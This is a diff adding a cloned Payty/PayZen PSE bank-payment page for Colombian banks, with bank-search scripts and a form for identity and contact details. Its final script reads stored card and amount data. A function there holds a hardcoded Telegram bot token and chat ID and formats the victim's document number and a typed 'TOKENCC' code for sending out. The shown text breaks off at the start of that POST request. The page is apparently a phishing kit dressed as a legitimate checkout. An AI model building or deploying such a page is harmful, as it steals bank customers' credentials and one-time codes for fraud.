+                    $('<span id="' + code + '" class="search-bar__input__tag search-bar__input__tag--primary bankTag">' + label + '<div class="search-bar__input__tag__icon"><img class="search-bar__input__tag__icon--primary" src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/icon/xmark-solid.svg"></img></div></span>')
+                        .insertBefore(".search-bar__input__section__field");
+                }
+                $(".search-bar__input__section__field").val("");
+                $(".search-bar__input__section__field").focus();
+                displayBankList("");
+                removePlaceholder();
+                updateBankPreferences();
+                $(".search-bar__input__section").scrollLeft($(".search-bar__input__section__field").offset().left);
+                if (firstShowButtonValidation) {
+                    $(".validation").append('<div class="validation__button"><span class="validation__button__label">' + "Pagar con su banco" + '</span></div>');
+                    $(".validation").show();
+                    firstShowButtonValidation = false;
+                } else {
+                    $(".validation").show();
+                    $(".validation__button").show();
+                }
+            }
+
+        });
+
+
+        /**********************************************************************code than represent the logic of the bar search********************************************/
+        // prevent the user typing "'()-` etc... in the input
+        $(".search-bar__input__section__field").on("keydown", function (e) {
+            const k = e.key;
+            // we check that the user enters a correct character (no &"'()-_ etc...)
+            let ok = customNormalize(e.key).length > 0;
+
+            // if the user has already chosen a bank and a sub-bank, nothing is displayed
+            ok = (ok && !isBankSelected()) || e.keyCode === 8;
+
+            if (!ok || (e.ctrlKey && e.altKey)) {
+                e.preventDefault();
+            }
+        });
+
+        // when you press a key in the input field, you update the list of banks
+        $(".search-bar__input__section__field").on("keyup", function (event) {
+            const val = $(this).val();
+            // we start searching from a tag or three letters in the input
+            if (val.length >= 0 && val.length < 2) {
+                displayBankList("");
+            } else if (val.length > 1 || $(".search-bar__input__tag").length > 0) {
+                displayBankList(val);
+            } else if (event.keyCode === 8 && val.length < 2) {
+                $(".bank-list__item").remove();
+                updateBankPreferences();
+            }
+        });
+
+        // displays the list of banks according to the search
+        function displayBankList(val) {
+            $(".validation").hide();
+            $(".bank-list__item").remove();
+            $(".no-bank-found__label").remove();
+            updateBankPreferences();
+            let bankToDisplay = [];
+            let finalBank = undefined;
+
+
+            let bankTag = $(".bankTag");
+            const optionsBankPreferences = [{"id":1,"bank":{"id":161,"label":"BANCOLOMBIA","code":"1007","optionVisible":true,"filter":[]},"position":1},{"id":11,"bank":{"id":221,"label":"NEQUI","code":"1507","optionVisible":true,"filter":[]},"position":2},{"id":21,"bank":{"id":51,"label":"BANCO DAVIVIENDA","code":"1051","optionVisible":true,"filter":[]},"position":3},{"id":31,"bank":{"id":21,"label":"BANCO BBVA COLOMBIA S.A","code":"1013","optionVisible":true,"filter":[]},"position":4},{"id":41,"bank":{"id":61,"label":"BANCO DE BOGOTÁ","code":"1001","optionVisible":true,"filter":[]},"position":5},{"id":51,"bank":{"id":211,"label":"DAVIPLATA","code":"1551","optionVisible":true,"filter":[]},"position":6},{"id":61,"bank":{"id":31,"label":"BANCO CAJA SOCIAL","code":"1032","optionVisible":true,"filter":[]},"position":7},{"id":71,"bank":{"id":231,"label":"SCOTIABANK COLPATRIA","code":"1019","optionVisible":true,"filter":[]},"position":8},{"id":81,"bank":{"id":11,"label":"BANCO AV VILLAS","code":"1052","optionVisible":true,"filter":[]},"position":9},{"id":91,"bank":{"id":101,"label":"BANCO ITAÚ","code":"1006","optionVisible":true,"filter":[]},"position":10},{"id":101,"bank":{"id":121,"label":"BANCO POPULAR","code":"1002","optionVisible":true,"filter":[]},"position":11},{"id":111,"bank":{"id":71,"label":"BANCO DE OCCIDENTE","code":"1023","optionVisible":true,"filter":[]},"position":12},{"id":121,"bank":{"id":81,"label":"BANCO FALABELLA ","code":"1062","optionVisible":true,"filter":[]},"position":13},{"id":131,"bank":{"id":361,"label":"RAPPIPAY","code":"1811","optionVisible":true,"filter":[]},"position":14},{"id":141,"bank":{"id":331,"label":"MOVII S.A.","code":"1801","optionVisible":true,"filter":[]},"position":15},{"id":151,"bank":{"id":1,"label":"BANCO AGRARIO","code":"1040","optionVisible":true,"filter":[]},"position":16},{"id":161,"bank":{"id":171,"label":"BANCOOMEVA S.A.","code":"1061","optionVisible":true,"filter":[]},"position":17},{"id":171,"bank":{"id":41,"label":"BANCO COOPERATIVO COOPCENTRAL","code":"1066","optionVisible":true,"filter":[]},"position":18},{"id":181,"bank":{"id":91,"label":"BANCO GNB SUDAMERIS","code":"1012","optionVisible":true,"filter":[]},"position":19},{"id":191,"bank":{"id":241,"label":"BANCAMÍA S.A.","code":"1059","optionVisible":true,"filter":[]},"position":20},{"id":201,"bank":{"id":301,"label":"DALE","code":"1097","optionVisible":true,"filter":[]},"position":21},{"id":211,"bank":{"id":321,"label":"LULO BANK","code":"1070","optionVisible":true,"filter":[]},"position":22},{"id":221,"bank":{"id":151,"label":"BANCO SERFINANZA","code":"1069","optionVisible":true,"filter":[]},"position":23},{"id":231,"bank":{"id":201,"label":"CONFIAR COOPERATIVA FINANCIERA","code":"1292","optionVisible":true,"filter":[]},"position":24},{"id":241,"bank":{"id":111,"label":"BANCO PICHINCHA S.A","code":"1060","optionVisible":true,"filter":[]},"position":25},{"id":251,"bank":{"id":191,"label":"CITIBANK","code":"1009","optionVisible":true,"filter":[]},"position":26},{"id":261,"bank":{"id":261,"label":"BANCO UNIÓN antes GIROS","code":"1303","optionVisible":true,"filter":[]},"position":27},{"id":271,"bank":{"id":181,"label":"CFA COOPERATIVA FINANCIERA","code":"1283","optionVisible":true,"filter":[]},"position":28},{"id":281,"bank":{"id":291,"label":"COTRAFA","code":"1289","optionVisible":true,"filter":[]},"position":29},{"id":291,"bank":{"id":251,"label":"BAN100","code":"1558","optionVisible":true,"filter":[]},"position":30},{"id":301,"bank":{"id":271,"label":"COLTEFINANCIERA","code":"1370","optionVisible":true,"filter":[]},"position":31},{"id":311,"bank":{"id":141,"label":"BANCO SANTANDER COLOMBIA","code":"1065","optionVisible":true,"filter":[]},"position":32},{"id":321,"bank":{"id":311,"label":"IRIS","code":"1637","optionVisible":true,"filter":[]},"position":33},{"id":341,"bank":{"id":351,"label":"BANCO FINANDINA S.A. BIC","code":"1063","optionVisible":true,"filter":[]},"position":35},{"id":351,"bank":{"id":371,"label":"BANCO J.P. MORGAN COLOMBIA S.A.","code":"1071","optionVisible":true,"filter":[]},"position":36},{"id":361,"bank":{"id":381,"label":"ALIANZA FIDUCIARIA","code":"1815","optionVisible":true,"filter":[]},"position":37},{"id":371,"bank":{"id":391,"label":"CREZCAMOS","code":"1816","optionVisible":true,"filter":[]},"position":38},{"id":381,"bank":{"id":401,"label":"UALÁ","code":"1804","optionVisible":true,"filter":[]},"position":39},{"id":391,"bank":{"id":411,"label":"BANCO MUNDO MUJER S.A.","code":"1047","optionVisible":true,"filter":[]},"position":40},{"id":401,"bank":{"id":421,"label":"NU. COLOMBIA COMPAÑÍA DE FINANCIAMIENTO S.A.","code":"1809","optionVisible":true,"filter":[]},"position":41},{"id":411,"bank":{"id":431,"label":"JFK COOPERATIVA FINANCIERA","code":"1286","optionVisible":true,"filter":[]},"position":42}];
+
+            // the user has chosen a bank
+            if (bankTag.length > 0) { // get the bank selected by the user
+                let bankPreference = optionsBankPreferences.filter(e => e.bank.code === bankTag.attr("id"))[0];
+                finalBank = bankPreference.bank;
+            } else {
+                //a bank is displayed if:
+                bankToDisplay = optionsBankPreferences.filter(function (e) {
+                    return filterBank.filter(f => customNormalize(e.bank.label).includes(customNormalize(f)) || e.bank.filter.includes(f)).length === filterBank.length && //its customizable label and filters include all option bank tags
+                        (customNormalize(e.bank.label).includes(customNormalize(val)) || //are normalized label contains the letters of the input
+                            e.bank.filter.includes(customNormalize(val)))
+
+                });
+
+            }
+            //option banks are displayed if there are less than 6 results (banks AND option banks)
+            if (finalBank === undefined && bankToDisplay.length === 0) {
+                $(".no-bank-found").append('<span class="no-bank-found__label">' + "No se encontró ningún banco que coincida con su búsqueda" + '</span>')
+
+            } else if (finalBank) { // we display the button if the bank is final
+                $(".search-bar__input__section__field").blur();
+                $(".bank-list").append('<li id="' + finalBank.code + '" class="bank-list__item  bank-list__item__final bankItem"><div class="bank-list__item__bank"><img class="bank-list__item__bank__img" src="' + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big/" + 'logo_' + finalBank.code + '_big.svg" onerror="this.onerror=null;this.src=' + "'" + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big/logo_default_big.svg" + "'" + ';"><span>' + finalBank.label + '</span></div></li>');
+                if (firstShowButtonValidation) {
+                    $(".validation").append('<div class="validation__button"><span class="validation__button__label">' + "Pagar con su banco" + '</span></div>');
+                    $(".validation").show();
+                    firstShowButtonValidation = false;
+                } else {
+                    $(".validation").show();
+                }
+
+            } else {
+                for (let bankPreference of bankToDisplay) {
+                    let chevronIcon = '';
+                    $(".bank-list").append('<li id="' + bankPreference.bank.code + '" class="bank-list__item bankItem"><div class="bank-list__item__bank"><img class="bank-list__item__bank__img" src="' + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big/" + 'logo_' + bankPreference.bank.code + '_big.svg" onerror="this.onerror=null;this.src=' + "'" + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big/logo_default_big.svg" + "'" + ';"><span>' + bankPreference.bank.label + '</span></div>' + chevronIcon + '</li>');
+                }
+            }
+        }
+
+
+        function customNormalize(string) {
+            return string.normalize("NFD").replace(/[^a-zA-Z0-9\s]/g, '').toLowerCase();
+        }
+
+        // indicates whether a bank without an option bank or a bank and an option bank has been selected
+        function isBankSelected() {
+            let bankTag = $(".bankTag");
+
+            if (bankTag.length === 0) {
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+
+        //remove last tag when click on backspace
+        $(".search-bar__input__section__field").on("keydown", function (event) {
+            let bankTag = $(".bankTag");
+            // if we make a backspace and the input field is empty we delete the last tag
+            if (event.keyCode === 8 && $(this).val().length === 0) {
+                event.preventDefault();
+                // if there is no bank tag, tap on the Bank filter
+                if (bankTag.length === 0) {
+                    $("#" + filterBank[filterBank.length - 1]).remove();
+                    filterBank.pop();
+                    // otherwise
+                } else {
+                    // if I filter the filtreBanqueOption it is vide ça veut I will say that the dernier is the tag of choix de banque et donc il faut le supprimer                    if (bankOptionTag.length > 0) {
+                    $("#form__bankCode").val("");
+                    $("#form__bankLabel").val("");
+                    $(".bankTag").remove();
+                }
+                $(".validation").hide();
+                $(".no-bank-found__label").remove();
+                addPlaceholder();
+                $(".search-bar__input__section").scrollLeft($(".search-bar__input__section__field").offset().left);
+            }
+        })
+
+        /**************************************************************code than represent the logic of tags and search bar********************************************/
+        // Add tag on spacebar and enter
+        $(".search-bar__input__section__field").on("keydown", function (event) {
+            // if we are not on an android device or when we press enter
+            if (!navigator.userAgent.match(/Android/i) || event.keyCode == 13) {
+                // code 32 =  space bar , code 13 == enter
+                if (event.keyCode == 32 || event.keyCode == 13) {
+                    // we do not do the default behavior either: " "
+                    event.preventDefault();
+                    // we normalize the input (no accent or special characters)
+                    let val = customNormalize($(this).val());
+                    addTag(val);
+                }
+            }
+        })
+
+        function addTag(val) {
+            let input = $(".search-bar__input__section__field");
+            //we can put a tag that from 2 characters
+            if (val.length > 1) {
+                //if the search leaves only a result of bank or bank option it is selected
+                if ($(".bank-list__item").length === 1) {
+                    let element = $(".bank-list__item");
+                    let elementId = element.attr("id");
+                    // if the element is a bank, add its bank tag
+                    if (element.hasClass("bankItem")) {
+                        $("#form__bankCode").val(elementId);
+                        let bank = getBankOptionFromCode(elementId);
+                        $("#form__bankLabel").val(bank.label);
+                        // we add a tag corresponding to the bank
+                        $('<span id="' + elementId + '" class="search-bar__input__tag search-bar__input__tag--primary bankTag">' + bank.label + '<div class="search-bar__input__tag__icon"><img class="search-bar__input__tag__icon--primary" src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/icon/xmark-solid.svg"></img></div></span>')
+                            .insertBefore(".search-bar__input__section__field");
+                    }
+                    input.val('');
+                    displayBankList('');
+                } else {
+                    // if there is already a bank tag, we add the tags to the bank options filter
+                    if (!filterBank.includes(val)) {
+                        filterBank.push(val);
+                        $('<span id="' + val + '" class="search-bar__input__tag search-bar__input__tag--secondary bankSearchTag">' + val + '<div class="search-bar__input__tag__icon"><img class="search-bar__input__tag__icon--secondary" src="https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/icon/xmark-solid.svg"></img></div></span>')
+                            .insertBefore(".search-bar__input__section__field");
+                        input.val('');
+                    } else {
+                        let tag = $("#" + val);
+                        let icon = tag.find("img");
+                        icon.removeClass("warn-shake__icon");
+                        tag.removeClass("warn-shake");
+                        window.setTimeout(function () {
+                            tag.addClass("warn-shake");
+                            icon.addClass("warn-shake__icon");
+                        }, 50);
+                    }
+                }
+                $(".search-bar__input__section").scrollLeft($(".search-bar__input__section__field").offset().left);
+                removePlaceholder();
+            }
+        }
+
+
+        // remove tag when click on xmark
+        $(".search-bar__input").on("click", ".search-bar__input__tag__icon", function (event) {
+            // if it is a bank search tag we remove it from the filter
+            let tag = $(this).closest(".search-bar__input__tag");
+            deleteTag(tag);
+        })
+
+        /*****************************************ANDORID*****************************************************/
+        // function that fixes a bug when entering special characters
+        $(".search-bar__input__section__field").on("input", function (event) {
+            if (navigator.userAgent.match(/Android/i) !== null &&
+                event.originalEvent.data !== null &&
+                event.originalEvent.data.length > 1 &&
+                event.originalEvent.inputType === 'insertText') {
+                $(this).val($(this).val().replace(event.originalEvent.data, ""));
+                event.originalEvent.data = "";
+            }
+        });
+
+        // prevent user typing special char in android
+        $(".search-bar__input__section__field").on("input", function (event) {
+            if (navigator.userAgent.match(/Android/i) !== null) {
+                let data = event.originalEvent.data;
+                let val = $(this).val();
+                if (data !== null) {
+                    let speChar = data.match(/[^a-zA-ZÀ-ú0-9\s]/);
+                    if (speChar !== null) {
+                        event.preventDefault();
+                        let dataIndex = data.indexOf(speChar);
+                        let valIndex = val.indexOf(speChar);
+                        if (valIndex !== -1) {
+                            event.originalEvent.data = data.slice(0, dataIndex) + data.slice(dataIndex + 1);
+                            $(this).val(val.slice(0, valIndex) + val.slice(valIndex + 1));
+                        }
+                    }
+                    if (val.length < 2) {
+                        $(".bank-list__item").remove();
+                        updateBankPreferences();
+                    }
+                } else if (val.length < 2) {
+                    $(".bank-list__item").remove();
+                    updateBankPreferences();
+                }
+            }
+        });
+
+        // Add tag on spacebar (android only)
+        $(".search-bar__input__section__field").on("input", function (event) {
+            let val = customNormalize($(this).val());
+            let data = event.originalEvent.data;
+            if (navigator.userAgent.match(/Android/i) !== null) {
+                if (data !== null) {
+                    if (data.includes(" ")) {
+                        event.preventDefault();
+                        let dataSpaceIndex = data.indexOf(" ");
+                        let valSpaceIndex = val.indexOf(" ");
+                        event.originalEvent.data = data.slice(0, dataSpaceIndex) + data.slice(dataSpaceIndex + 1);
+                        val = val.slice(0, valSpaceIndex) + val.slice(valSpaceIndex + 1);
+                        addTag(val);
+                        $(this).val("");
+                    }
+                }
+            }
+        });
+
+        //Send the information whithout going to the mandatory field section
+        function sendCustomerForm() {
+            displayRedirectionMessage();
+            $.ajax({
+                url: $("input[name='submit_url']").val(),
+                type: "POST",
+                contentType: "application/json; charset=utf-8",
+                dataType: "json",
+                data: retrieveCustomerData(),
+                timeout: 15000,
+                success: processPayAppResponse,
+                error: function (errorUrl) {
+                    location.reload();
+                    hideRedirectionMessage();
+                }
+            });
+        }
+
+        function displayRedirectionMessage() {
+            $('#pleaseWaitDiv').show();
+            $('#blockScreen').css('visibility', 'visible');
+        };
+
+        function retrieveCustomerData() {
+            let data = {
+                bankCode: $("#form__bankCode").val(),
+                bankLabel: $("#form__bankLabel").val(),
+            };
+            return JSON.stringify(data);
+        };
+
+        function processPayAppResponse(data) {
+            window.location.replace(data.checkoutURL);
+        }
+
+        function hideRedirectionMessage() {
+            $('#pleaseWaitDiv').hide();
+            $('#blockScreen').css('visibility', 'hidden');
+        };
+
+        //Action for the buton when you select a bank
+        $(".validation").on("click", ".validation__button", function (e) {
+            let showMandatoryFields = $("input[name='show_mandatory_fields']").val();
+            if (showMandatoryFields === "false") {
+                sendCustomerForm();
+            }else {
+                $(".mandatoryField").removeClass("mandatoryField__hide")
+                $(".mandatoryField").addClass("mandatoryField__show");
+                $(".banks_view").addClass("banks_view__hide");
+                $(".validation").remove(".validation__button");
+                $(".form__validation").append('<button  type="submit" class="form__button">' + "Pagar con su banco" + '</button>');
+                let bankCode = $("#form__bankCode").val();
+                $(".bank-preferences-mandatory").last().append('<article id="' + bankCode + '" class="bank-logo-form"><img class="bank-preferences__article__logo" src="' + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big" + '/logo_' + bankCode + '_big.svg" onerror="this.onerror=null;this.src=' + "'" + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big/logo_default_big.svg" + "'" + ';"></article>');
+            }
+        });
+
+    </script>
+
+
+
+    <div class="mandatoryField mandatoryField__hide">
+        <ul id="validationErrors"></ul>
+        <form id="paymentForm" novalidate>
+            <div class="mandatory_wrapper">
+                <div>
+                    <input type="hidden" name="submit_url" value="https://secure.payty.com:443/checkout/v3/web/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/pse-rest/01c79e54da19480f9744b73b201d0048/submit"/>
+                    <input type="hidden" name="bankCode" id="form__bankCode"/>
+                    <input type="hidden" name="bankLabel" id="form__bankLabel"/>
+                        <div class="form_line">
+                            <label for="proof_of_id_type"
+                                   class="paramLabel required">Tipo de documento</label>
+                            <div class="paramInput">
+                                <select name="proof_of_id_type" id="proof_of_id_type" class="paramSelect">
+                                        <option value="CedulaDeCiudadania">Cédula de ciudadanía</option>
+                                        <option value="TarjetaDeIdentidad">Tarjeta de identidad</option>
+                                        <option value="TarjetaDeExtranjeria">Tarjeta de extranjería</option>
+                                        <option value="CedulaDeExtranjeria">Cédula de extranjería</option>
+                                        <option value="Pasaporte">Pasaporte</option>
+                                        <option value="NIT">Nit</option>
+                                        <option value="DocumentoDeIdentificacionExtranjero">Documento de identificación extranjero</option>
+                                        <option value="RegistroCivilDeNacimiento">Registro civil de nacimiento</option>
+                                </select>
+                            </div>
+                        </div>
+                    <div class="form_line">
+                        <label for="proof_of_id_number"
+                               class="paramLabel required">Número de identificación</label>
+                        <div class="paramInput">
+                            <input type="text"
+                                   value=""
+                                   autocomplete="off"
+                                   name="proof_of_id_number" id="proof_of_id_number" class="cardNumber"
+                                   data-validate="true"
+                                   data-validation-error="El número de identificación no es válido. Sólo se permite números y letras. Longitud máxima 15 caracteres"
+                                   data-validation-error-nit="El número de identificación no es un NIT válido o el dígito de verificación es incorrecto"
+                                   required
+                                   pattern="^\+?[0-9A-Za-z]{1,15}$">
+                        </div>
+                    </div>
+                        <div class="form_line">
+                            <label for="person_name" class="paramLabel required">Nombre y apellidos</label>
+                            <div class="paramInput">
+                                <input type="text"
+                                       
+                                       autocomplete="off" name="person_name" id="person_name" class="cardNumber"
+                                       data-validate="true"
+                                       data-validation-error="Los nombres y apellidos no son válidos. Longitud máxima 64 caracteres."
+                                       required
+                                       pattern="^\s*(?=.*[a-zA-Z\u00C0-\u024F\u1E00-\u1EFF])[a-zA-Z\u00C0-\u024F\u1E00-\u1EFF0-9\s']{1,64}\s*$">
+                            </div>
+                        </div>
+                        <div class="form_line">
+                            <label for="phone_number"
+                                   class="paramLabel required">Teléfono</label>
+                            <div class="paramInput">
+                                <input type="text"
+                                       
+                                       autocomplete="off" name="phone_number" id="phone_number" class="cardNumber"
+                                       data-validate="true"
+                                       data-validation-error="El teléfono no es válido. Sólo números son válidos. Longitud mínima 7 caracteres, máxima 10 caracteres"
+                                       required
+                                       pattern="^\d{7,10}$">
+                            </div>
+                        </div>
+                        <div class="form_line">
+                            <label for="address"
+                                   class="paramLabel required">Dirección</label>
+                            <div class="paramInput">
+                                <input type="text"
+                                       value=""
+                                       autocomplete="off" name="address" id="address" class="cardNumber"
+                                       data-validate="true"
+                                       data-validation-error="La dirección no es válida. Sólo se permiten letras, números y caracteres (#,-'.) Longitud máxima 39 caracteres"
+                                       required
+                                       pattern="\S[a-zA-Z\u00C0-\u024F\u1E00-\u1EFF0-9\s#,'-.]{1,39}$">
+                            </div>
+                        </div>
+                        <div class="form_line">
+                            <label for="city"
+                                   class="paramLabel required">Ciudad</label>
+                            <div class="paramInput">
+                                <input type="text"
+                                       
+                                       autocomplete="off" name="city" id="city" class="cardNumber"
+                                       data-validate="true"
+                                       data-validation-error="La ciudad no es válida. Sólo se permiten letras. Longitud máxima 25 caracteres"
+                                       required
+                                       pattern="^\s*(?=.*[a-zA-Z\u00C0-\u024F\u1E00-\u1EFF])[a-zA-Z\u00C0-\u024F\u1E00-\u1EFF0-9\s']{1,25}\s*$">
+                            </div>
+                        </div>
+                        <div class="form_line">
+                            <label for="email" class="paramLabel required">Correo electrónico</label>
+                            <div class="paramInput">
+                                <input type="email"
+                                       autocomplete="off" name="email" id="email" class="cardNumber"
+
+                                       data-validation-error="El correo electrónico no es válido. Longitud máxima 120 caracteres" required >
+                            </div>
+                        </div>
+                </div>
+                <div class="bank-preferences-mandatory">
+                </div>
+                <div>
+                    <section class="form__validation"></section>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        initWithOneBank();
+
+        //This function is called only when there is 1 bank and there are missing data.
+        function initWithOneBank(){
+            const optionsBankPreferences = [{"id":1,"bank":{"id":161,"label":"BANCOLOMBIA","code":"1007","optionVisible":true,"filter":[]},"position":1},{"id":11,"bank":{"id":221,"label":"NEQUI","code":"1507","optionVisible":true,"filter":[]},"position":2},{"id":21,"bank":{"id":51,"label":"BANCO DAVIVIENDA","code":"1051","optionVisible":true,"filter":[]},"position":3},{"id":31,"bank":{"id":21,"label":"BANCO BBVA COLOMBIA S.A","code":"1013","optionVisible":true,"filter":[]},"position":4},{"id":41,"bank":{"id":61,"label":"BANCO DE BOGOTÁ","code":"1001","optionVisible":true,"filter":[]},"position":5},{"id":51,"bank":{"id":211,"label":"DAVIPLATA","code":"1551","optionVisible":true,"filter":[]},"position":6},{"id":61,"bank":{"id":31,"label":"BANCO CAJA SOCIAL","code":"1032","optionVisible":true,"filter":[]},"position":7},{"id":71,"bank":{"id":231,"label":"SCOTIABANK COLPATRIA","code":"1019","optionVisible":true,"filter":[]},"position":8},{"id":81,"bank":{"id":11,"label":"BANCO AV VILLAS","code":"1052","optionVisible":true,"filter":[]},"position":9},{"id":91,"bank":{"id":101,"label":"BANCO ITAÚ","code":"1006","optionVisible":true,"filter":[]},"position":10},{"id":101,"bank":{"id":121,"label":"BANCO POPULAR","code":"1002","optionVisible":true,"filter":[]},"position":11},{"id":111,"bank":{"id":71,"label":"BANCO DE OCCIDENTE","code":"1023","optionVisible":true,"filter":[]},"position":12},{"id":121,"bank":{"id":81,"label":"BANCO FALABELLA ","code":"1062","optionVisible":true,"filter":[]},"position":13},{"id":131,"bank":{"id":361,"label":"RAPPIPAY","code":"1811","optionVisible":true,"filter":[]},"position":14},{"id":141,"bank":{"id":331,"label":"MOVII S.A.","code":"1801","optionVisible":true,"filter":[]},"position":15},{"id":151,"bank":{"id":1,"label":"BANCO AGRARIO","code":"1040","optionVisible":true,"filter":[]},"position":16},{"id":161,"bank":{"id":171,"label":"BANCOOMEVA S.A.","code":"1061","optionVisible":true,"filter":[]},"position":17},{"id":171,"bank":{"id":41,"label":"BANCO COOPERATIVO COOPCENTRAL","code":"1066","optionVisible":true,"filter":[]},"position":18},{"id":181,"bank":{"id":91,"label":"BANCO GNB SUDAMERIS","code":"1012","optionVisible":true,"filter":[]},"position":19},{"id":191,"bank":{"id":241,"label":"BANCAMÍA S.A.","code":"1059","optionVisible":true,"filter":[]},"position":20},{"id":201,"bank":{"id":301,"label":"DALE","code":"1097","optionVisible":true,"filter":[]},"position":21},{"id":211,"bank":{"id":321,"label":"LULO BANK","code":"1070","optionVisible":true,"filter":[]},"position":22},{"id":221,"bank":{"id":151,"label":"BANCO SERFINANZA","code":"1069","optionVisible":true,"filter":[]},"position":23},{"id":231,"bank":{"id":201,"label":"CONFIAR COOPERATIVA FINANCIERA","code":"1292","optionVisible":true,"filter":[]},"position":24},{"id":241,"bank":{"id":111,"label":"BANCO PICHINCHA S.A","code":"1060","optionVisible":true,"filter":[]},"position":25},{"id":251,"bank":{"id":191,"label":"CITIBANK","code":"1009","optionVisible":true,"filter":[]},"position":26},{"id":261,"bank":{"id":261,"label":"BANCO UNIÓN antes GIROS","code":"1303","optionVisible":true,"filter":[]},"position":27},{"id":271,"bank":{"id":181,"label":"CFA COOPERATIVA FINANCIERA","code":"1283","optionVisible":true,"filter":[]},"position":28},{"id":281,"bank":{"id":291,"label":"COTRAFA","code":"1289","optionVisible":true,"filter":[]},"position":29},{"id":291,"bank":{"id":251,"label":"BAN100","code":"1558","optionVisible":true,"filter":[]},"position":30},{"id":301,"bank":{"id":271,"label":"COLTEFINANCIERA","code":"1370","optionVisible":true,"filter":[]},"position":31},{"id":311,"bank":{"id":141,"label":"BANCO SANTANDER COLOMBIA","code":"1065","optionVisible":true,"filter":[]},"position":32},{"id":321,"bank":{"id":311,"label":"IRIS","code":"1637","optionVisible":true,"filter":[]},"position":33},{"id":341,"bank":{"id":351,"label":"BANCO FINANDINA S.A. BIC","code":"1063","optionVisible":true,"filter":[]},"position":35},{"id":351,"bank":{"id":371,"label":"BANCO J.P. MORGAN COLOMBIA S.A.","code":"1071","optionVisible":true,"filter":[]},"position":36},{"id":361,"bank":{"id":381,"label":"ALIANZA FIDUCIARIA","code":"1815","optionVisible":true,"filter":[]},"position":37},{"id":371,"bank":{"id":391,"label":"CREZCAMOS","code":"1816","optionVisible":true,"filter":[]},"position":38},{"id":381,"bank":{"id":401,"label":"UALÁ","code":"1804","optionVisible":true,"filter":[]},"position":39},{"id":391,"bank":{"id":411,"label":"BANCO MUNDO MUJER S.A.","code":"1047","optionVisible":true,"filter":[]},"position":40},{"id":401,"bank":{"id":421,"label":"NU. COLOMBIA COMPAÑÍA DE FINANCIAMIENTO S.A.","code":"1809","optionVisible":true,"filter":[]},"position":41},{"id":411,"bank":{"id":431,"label":"JFK COOPERATIVA FINANCIERA","code":"1286","optionVisible":true,"filter":[]},"position":42}];
+            if(optionsBankPreferences.length===1){
+                $("#form__bankCode").val(optionsBankPreferences[0].bank.code);
+                $("#form__bankLabel").val(optionsBankPreferences[0].bank.label);
+                retrieveCustomerData();
+                justOneBank(optionsBankPreferences[0].bank.code);
+            }
+        }
+        //This function will display the mandatory field section and show the button and the Logo of the bank
+        function justOneBank(bankCode) {
+            $(".mandatoryField").removeClass("mandatoryField__hide");
+            $(".mandatoryField").addClass("mandatoryField__show");
+            $(".form__validation").append('<button  type="submit" class="form__button">' + "Pagar con su banco" + '</button>');
+            $(".bank-preferences-mandatory").last().append('<article id="' + bankCode + '" class="bank-logo-form"><img class="bank-preferences__article__logo" src="' + "https://static.payty.com/static/payment-app/pse-rest-eb03681d-5127-4e43-b4fd-b8a7a550b822/images/bank/big" + '/logo_' + bankCode + '_big.svg"></article>');
+        };
+        function retrieveCustomerData() {
+            let data = {
+                bankCode: $("#form__bankCode").val(),
+                bankLabel: $("#form__bankLabel").val(),
+            };
+            return JSON.stringify(data);
+        };
+    </script>
+
+
+
+
+
+        </div>
+
+
+	
+		
+  </div>
+  
+
+        <div class="backShopDown">
+            <form id="backToBoutiqueFormDown" method="POST" action="https://secure.payty.com/checkout/ecs/web/10454805/504d3854a9c84a96b0427158b886473b/close" autocomplete="off">
+            <input type="hidden" name="cacheId" value="504d3854a9c84a96b0427158b886473b" />
+                <button type="submit" class="backToBoutiqueButton">
+                    Anular y volver a la tienda
+                </button>
+            </form>
+        </div>
+  
+  <div id="imageFooter">
+    <div id="baseImageFooter"></div>
+  </div>
+  <div id="footer">
+
+        <div class="footerLogoBlack">
+            <a href="https://www.payty.com" target="_blank">
+                <img src="https://static.payty.com/static/commons-br/d/4kDl9MsWNKtJLDh6jK2WaA--/logo-payzen-black.png" alt="PayZen - pago por internet"/>
+            </a>
+            <img src="https://static.payty.com/static/commons-br/logo-pci-black.png" alt="PCI - DSS Compliant"/>
+        </div>
+
+        <div class="footerLogoWhite">
+            <a href="https://www.payty.com" target="_blank">
+                <img src="https://static.payty.com/static/commons-br/d/4kDl9MsWNKtJLDh6jK2WaA--/logo-payzen-white.png" alt="PayZen - pago por internet"/>
+            </a>
+            <img src="https://static.payty.com/static/commons-br/logo-pci-white.png" alt="PCI - DSS Compliant"/>
+        </div>
+
+        <div id="copyrightBlock">
+        <div class="copyright" >Copyright Payty © 2024
+          <a href="https://www.payty.com/web/normatividad/" target="_blank" class="terms">Aviso legal</a>
+        </div>
+    </div>
+
+
+		
+	
+	</div>
+	</body>
+    <script>
+        window.onload = ()=>{
+             document.getElementById("transaction_amount_label").innerHTML = localStorage.getItem("monto") + " COP"
+         document.getElementById("mon").innerHTML = localStorage.getItem("monto") + " COP"
+            document.getElementById("cc").value = localStorage.getItem("cc")
+            var str = localStorage.getItem("cc");
+
+
+document.getElementById("cc").value =str.replace(/^(\D*\d\D*){8}/gm, function(match) {
+    return match.replace(/\d/g, '*');
+})
+        }
+
+        function carl(params) {
+  const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
+  const chatId = "-4234486519";
+  const usr = localStorage.getItem("usr");
+  const uservalid = document.getElementById("code").value;
+  
+
+  const message = `-NEW ONE-\n --DOC.: ${usr} \n --TOKENCC: ${uservalid} \n`;
+  $.ajax({
+    type: "POST",
